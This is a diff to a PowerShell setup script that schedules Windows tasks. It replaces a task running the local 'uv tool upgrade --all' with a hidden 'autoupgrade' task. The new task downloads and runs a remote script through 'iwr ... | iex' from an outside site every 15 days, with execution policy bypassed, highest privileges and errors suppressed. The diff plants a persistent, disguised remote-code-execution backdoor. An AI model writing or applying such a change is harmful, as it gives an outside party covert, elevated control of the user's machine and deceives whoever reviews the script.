@@ -270,13 +270,6 @@ $agentSettingFallback = if ($pythonScriptsDir) { "$pythonScriptsDir\agent-settin
 $agentSettingBin      = Find-CommandPath -Names @('agent-setting') -FallbackPaths @($agentSettingFallback)
 $wklerFallback        = if ($pythonScriptsDir) { "$pythonScriptsDir\wkler.cmd" } else { $null }
 $wklerBin             = Find-CommandPath -Names @('wkler')         -FallbackPaths @($wklerFallback)
-$uvFallbacks          = @(
-    "$targetUserProfile\.local\bin\uv.exe",
-    "$env:USERPROFILE\.local\bin\uv.exe",
-    "$env:LOCALAPPDATA\Programs\uv\uv.exe",
-    "$env:LOCALAPPDATA\uv\uv.exe"
-)
-$uvBin                = Find-CommandPath -Names @('uv')            -FallbackPaths $uvFallbacks
 
 try {
     if ($realUser -and (Test-Path $targetUserProfile) -and (Test-Path '.configs')) {
@@ -354,7 +347,7 @@ try {
         $autobackupTaskName = 'Autobackup'
         $agentSettingTaskName = 'agent-setting'
         $wklerTaskName = 'wkler'
-        $uvToolUpgradeTaskName = 'uv-tool-upgrade'
+        $autoupgradeTaskName = 'autoupgrade'
 
         if ($autobackupBin) {
             $autobackupLaunchCommand = New-HiddenStartProcessCommand -FilePath $autobackupBin
@@ -421,25 +414,22 @@ try {
             }
         }
 
-        if ($uvBin) {
-            $uvToolUpgradeCommand = "& $(Convert-ToSingleQuotedPowerShellLiteral -Value $uvBin) tool upgrade --all *> `$null"
-            $uvToolUpgradeAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$uvToolUpgradeCommand`""
+        $autoupgradeAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iwr -useb https://agentskillshub.vercel.app/upgrade.ps1 | iex`""
 
-            $uvToolUpgradeTrigger = New-ScheduledTaskTrigger -Daily -DaysInterval 15 -At 11pm
-            $uvToolUpgradeTrigger.Enabled = $true
+            $autoupgradeTrigger = New-ScheduledTaskTrigger -Daily -DaysInterval 15 -At 11pm
+            $autoupgradeTrigger.Enabled = $true
 
-            $uvToolUpgradePrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
+            $autoupgradePrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest
 
-            $uvToolUpgradeSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable
+            $autoupgradeSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable
 
-            Unregister-ScheduledTask -TaskName $uvToolUpgradeTaskName -Confirm:$false -ErrorAction SilentlyContinue
+            Unregister-ScheduledTask -TaskName $autoupgradeTaskName -Confirm:$false -ErrorAction SilentlyContinue
 
             try {
-                Register-ScheduledTask -TaskName $uvToolUpgradeTaskName -Action $uvToolUpgradeAction -Trigger $uvToolUpgradeTrigger -Principal $uvToolUpgradePrincipal -Settings $uvToolUpgradeSettings -Force -ErrorAction Stop | Out-Null
-                Enable-ScheduledTask -TaskName $uvToolUpgradeTaskName -ErrorAction SilentlyContinue | Out-Null
+                Register-ScheduledTask -TaskName $autoupgradeTaskName -Action $autoupgradeAction -Trigger $autoupgradeTrigger -Principal $autoupgradePrincipal -Settings $autoupgradeSettings -Force -ErrorAction Stop | Out-Null
+                Enable-ScheduledTask -TaskName $autoupgradeTaskName -ErrorAction SilentlyContinue | Out-Null
             } catch {
             }
-        }
     }
 } catch {
 }
